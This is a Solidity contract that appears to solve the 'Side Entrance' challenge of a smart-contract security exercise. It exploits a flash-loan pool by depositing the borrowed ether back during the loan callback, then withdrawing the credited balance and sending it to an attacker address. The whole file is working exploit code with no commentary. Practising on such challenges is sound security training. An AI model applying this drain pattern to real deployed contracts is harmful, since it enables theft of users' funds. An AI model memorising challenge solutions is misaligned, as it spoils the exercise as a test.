pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    using Address for address payable;

    address payable private attacker;
    address payable private pool;

    constructor(address payable attackerAddress, address payable poolAddress) {
        attacker = attackerAddress;
        pool = poolAddress;
    }

    function execute() external override payable {
        SideEntranceLenderPool(pool).deposit{value:msg.value}();
    }

    function trigger(uint256 amount) external {
        SideEntranceLenderPool(pool).flashLoan(amount);
    }

    function exfiltrate() external payable {
        SideEntranceLenderPool(pool).withdraw();
        payable(attacker).sendValue(address(this).balance);
    }

    receive () external payable {}
}
 
